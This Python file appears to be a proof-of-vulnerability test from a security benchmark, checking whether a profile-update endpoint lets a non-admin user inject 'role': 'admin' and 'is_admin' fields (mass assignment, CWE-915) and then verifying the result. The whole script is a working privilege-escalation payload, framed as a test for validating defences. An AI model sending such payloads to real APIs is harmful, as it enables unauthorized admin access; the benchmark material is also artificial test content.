"""
Proof of Vulnerability (PoV) for BOPLA_MASS_ASSIGN (CWE-915)
Target: PUT /users/{user_id}/profile

Checks if a non-admin user can escalate privilege by injecting unvalidated
fields ("role": "admin", "is_admin": True) into a profile update.
Oracle (VULN_TAXONOMY.md §4):
  - Exploited (True): Send privileged field not present in declared input schema;
    subsequent read shows field was persisted in storage.
  - Secure (False): Extra fields rejected (422 Unprocessable Entity) or stripped
    via extra="forbid", and subsequent read confirms role unchanged.
"""
from __future__ import annotations

import sys
from typing import Any
import httpx


def run_pov(client_or_url: Any) -> dict[str, Any]:
    """Execute BOPLA_MASS_ASSIGN PoV against a TestClient, httpx.Client, or base URL."""
    headers = {"Authorization": "Bearer alice-token-123"}
    update_path = "/users/usr_alice_01/profile"
    read_path = "/users/usr_alice_01"

    malicious_payload = {
        "display_name": "Alice Exploit",
        "bio": "Attempting privilege escalation",
        "role": "admin",
        "is_admin": True,
    }

    if isinstance(client_or_url, str):
        base = client_or_url.rstrip("/")
        with httpx.Client() as client:
            put_resp = client.put(base + update_path, json=malicious_payload, headers=headers, timeout=5.0)
            get_resp = client.get(base + read_path, headers=headers, timeout=5.0)
    else:
        put_resp = client_or_url.put(update_path, json=malicious_payload, headers=headers)
        get_resp = client_or_url.get(read_path, headers=headers)

    if get_resp.status_code == 200:
        user_data = get_resp.json()
        if user_data.get("role") == "admin" or user_data.get("is_admin") is True:
            return {
                "exploited": True,
                "vuln_id": "VULN-BOPLA-001",
                "category": "BOPLA_MASS_ASSIGN",
                "cwe": "CWE-915",
                "put_status_code": put_resp.status_code,
                "evidence": {
                    "injected_fields": {"role": "admin", "is_admin": True},
                    "persisted_role": user_data.get("role"),
                    "persisted_is_admin": user_data.get("is_admin"),
                },
            }

    return {
        "exploited": False,
        "vuln_id": "VULN-BOPLA-001",
        "category": "BOPLA_MASS_ASSIGN",
        "cwe": "CWE-915",
        "put_status_code": put_resp.status_code,
        "get_status_code": get_resp.status_code,
    }


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    result = run_pov(target)
    print(result)
    sys.exit(0 if result["exploited"] else 1)
